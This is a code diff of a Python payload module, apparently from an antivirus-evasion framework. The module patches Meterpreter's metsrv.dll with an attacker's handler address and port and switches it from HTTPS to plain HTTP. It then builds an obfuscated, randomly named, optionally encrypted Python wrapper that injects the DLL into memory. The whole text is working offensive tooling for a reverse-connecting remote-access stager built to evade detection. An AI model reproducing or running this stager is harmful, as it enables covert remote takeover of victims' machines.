@@ -1,40 +1,37 @@
 """
 
 Reads in metsrv.dll, patches it with appropriate options for a 
-meterpreter reverse_https payload compresses/bas64 encodes it 
+meterpreter reverse_http payload compresses/bas64 encodes it 
 and then builds a python injection wrapper to inject the contained 
 meterpreter dll into memory.
 
-Concept and module by @the_grayhound
+Concept and module by @harmj0y
 
 """
 
 import struct, string, random, sys, os
 
-from modules.common import messages
-from modules.common import randomizer
 from modules.common import helpers
-from modules.common import crypters
+from modules.common import encryption
 
 import settings
 
 
-class Stager:
+class Payload:
     
     def __init__(self):
         # required options
-        self.shortname = "MeterHTTPSContained"
-        self.description = "self-contained windows/meterpreter/reverse_https stager, no shellcode"
+        self.description = "self-contained windows/meterpreter/reverse_http stager, no shellcode"
         self.language = "python"
         self.rating = "Excellent"
         self.extension = "py"
         
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
-                                "LHOST" : ["", "IP of the metasploit handler"],
-                                "LPORT" : ["", "Port of the metasploit handler"]}
+                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
+                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
+                                 "LHOST" : ["", "IP of the metasploit handler"],
+                                 "LPORT" : ["80", "Port of the metasploit handler"]}
         
         
     # helper for the metasploit http checksum algorithm
@@ -72,8 +69,8 @@ class Stager:
         dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
 
         # patch the metsrv.dll header
-        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xb0"
-        headerPatch += "\x0e\x00\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
+        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x57"
+        headerPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
         headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
         meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)
 
@@ -84,12 +81,12 @@ class Stager:
 
         # turn off SSL
         sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
-        sslString = "METERPRETER_TRANSPORT_HTTPS\x00"
+        sslString = "METERPRETER_TRANSPORT_HTTP\x00"
         meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)
 
         # replace the URL/port of the handler
         urlIndex = meterpreterDll.index("https://" + ("X" * 256))
-        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + randomizer.randomString(16) + "/\x00"
+        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
         meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
         
         # replace the expiration timeout with the default value of 300
@@ -114,17 +111,17 @@ class Stager:
             # doing void * cast
             payloadCode += "from ctypes import *\nimport base64,zlib\n"
 
-            randInflateFuncName = randomizer.randomString()
-            randb64stringName = randomizer.randomString()
-            randVarName = randomizer.randomString()
+            randInflateFuncName = helpers.randomString()
+            randb64stringName = helpers.randomString()
+            randVarName = helpers.randomString()
 
             # deflate function
             payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
             payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
             payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"
 
-            randVarName = randomizer.randomString()
-            randFuncName = randomizer.randomString()
+            randVarName = helpers.randomString()
+            randFuncName = helpers.randomString()
             
             payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
             payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
@@ -135,12 +132,12 @@ class Stager:
 
             payloadCode += 'import ctypes,base64,zlib\n'
 
-            randInflateFuncName = randomizer.randomString()
-            randb64stringName = randomizer.randomString()
-            randVarName = randomizer.randomString()
-            randPtr = randomizer.randomString()
-            randBuf = randomizer.randomString()
-            randHt = randomizer.randomString()
+            randInflateFuncName = helpers.randomString()
+            randb64stringName = helpers.randomString()
+            randVarName = helpers.randomString()
+            randPtr = helpers.randomString()
+            randBuf = helpers.randomString()
+            randHt = helpers.randomString()
 
             # deflate function
             payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
@@ -156,6 +153,6 @@ class Stager:
 
         
         if self.required_options["use_pyherion"][0].lower() == "y":
-            payloadCode = crypters.pyherion(payloadCode)
+            payloadCode = encryption.pyherion(payloadCode)
 
         return payloadCode
